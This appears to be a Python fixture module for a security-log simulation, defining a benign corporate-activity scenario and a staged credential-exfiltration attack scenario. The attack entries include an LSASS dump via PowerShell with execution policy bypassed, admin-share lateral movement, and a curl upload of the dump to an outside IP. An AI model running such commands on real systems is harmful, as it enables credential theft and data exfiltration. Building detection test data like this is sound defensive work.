from typing import List, Dict, Any
from .schemas import SecurityLog

# Standard Corporate Activity: Normal business hours logs showing clean intranet logins.
STANDARD_CORPORATE_ACTIVITY: List[Dict[str, Any]] = [
    {
        "timestamp": "2026-07-18T09:00:00Z",
        "source_system": "ActiveDirectory-DomainController",
        "event_id": 4624,
        "user_id": "operator_01",
        "source_ip": "10.0.1.25",
        "destination_ip": "10.0.1.1",
        "process_name": "lsass.exe",
        "command_line": None,
        "description": "Successful user logon using Kerberos protocol during standard shift hours."
    },
    {
        "timestamp": "2026-07-18T11:15:30Z",
        "source_system": "Workstation-Office-B",
        "event_id": 4688,
        "user_id": "analyst_beta",
        "source_ip": "10.0.2.14",
        "destination_ip": None,
        "process_name": "outlook.exe",
        "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
        "description": "Standard application startup by authenticated corporate user."
    },
    {
        "timestamp": "2026-07-18T14:45:00Z",
        "source_system": "Internal-File-Share",
        "event_id": 5140,
        "user_id": "operator_01",
        "source_ip": "10.0.1.25",
        "destination_ip": "10.0.10.5",
        "process_name": None,
        "command_line": None,
        "description": "A network share object was accessed by authenticated workstation."
    }
]

# APT Credential Exfiltration 2AM: A 4-stage attack payload timeline
APT_CREDENTIAL_EXFILTRATION_2AM: List[Dict[str, Any]] = [
    {
        "timestamp": "2026-07-18T02:00:00Z",
        "source_system": "External-Gateway-VPN",
        "event_id": 4624,
        "user_id": "Administrator",
        "source_ip": "198.51.100.72",
        "destination_ip": "10.0.5.10",
        "process_name": "sshd.exe",
        "command_line": None,
        "description": "Administrative account login established from external rogue public IP address."
    },
    {
        "timestamp": "2026-07-18T02:05:00Z",
        "source_system": "DomainController-Primary",
        "event_id": 4688,
        "user_id": "Administrator",
        "source_ip": "10.0.5.10",
        "destination_ip": None,
        "process_name": "powershell.exe",
        "command_line": "powershell.exe -ExecutionPolicy Bypass -File dump_lsass.ps1",
        "description": "PowerShell command executed with bypass constraints executing LSASS memory dumper script."
    },
    {
        "timestamp": "2026-07-18T02:10:00Z",
        "source_system": "Database-Server-CNI",
        "event_id": 5038,
        "user_id": "Administrator",
        "source_ip": "10.0.5.10",
        "destination_ip": "10.0.5.50",
        "process_name": "cmd.exe",
        "command_line": "net use \\\\10.0.5.50\\C$ /user:Administrator",
        "description": "Lateral movement attempt utilizing administrative credentials to map database server filesystem."
    },
    {
        "timestamp": "2026-07-18T02:15:00Z",
        "source_system": "Database-Server-CNI",
        "event_id": None,
        "user_id": "Administrator",
        "source_ip": "10.0.5.50",
        "destination_ip": "203.0.113.88",
        "process_name": "curl.exe",
        "command_line": "curl -F file=@lsass_dump.dmp http://203.0.113.88/upload",
        "description": "Outbound connection spike detected transmitting large memory dump files to foreign server."
    }
]

# Scenario Dictionary
SIMULATION_SCENARIOS: Dict[str, List[Dict[str, Any]]] = {
    "Standard_Corporate_Activity": STANDARD_CORPORATE_ACTIVITY,
    "APT_Credential_Exfiltration_2AM": APT_CREDENTIAL_EXFILTRATION_2AM
}

def get_scenario_logs(scenario_name: str) -> List[SecurityLog]:
    """Retrieve security logs parsed into SecurityLog Pydantic model objects."""
    raw_logs = SIMULATION_SCENARIOS.get(scenario_name, [])
    return [SecurityLog(**log) for log in raw_logs]
